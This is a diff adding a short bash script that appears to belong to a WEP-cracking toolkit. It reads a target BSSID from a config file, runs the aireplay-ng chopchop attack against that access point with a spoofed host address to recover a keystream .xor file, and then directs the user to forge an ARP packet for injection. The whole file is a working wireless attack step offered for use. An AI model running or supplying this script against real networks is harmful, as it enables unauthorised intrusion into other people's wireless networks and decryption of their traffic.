@@ -1,0 +1,21 @@
+#!/bin/bash
+
+if [ "$(id -u)" != "0" ]; then
+	echo "This script must be run as root" 1>&2
+	exit 1
+fi
+
+if [ -f ../../cfg/target.conf ]; then
+	. ../../cfg/target.conf
+else
+	echo "Error: No target set!"
+	exit 1
+fi
+
+. ../../cfg/hardware.conf
+
+echo "This attack grabs a data packet and passes it back. When successful, it will generate"
+echo "a fragment*.xor file in this folder."
+aireplay-ng -4 -b $BSSID -h $FAKE_HOST $WLAN
+echo ""
+echo "Now you should run forgepacket to use the new xor file to make an ARP packet!"
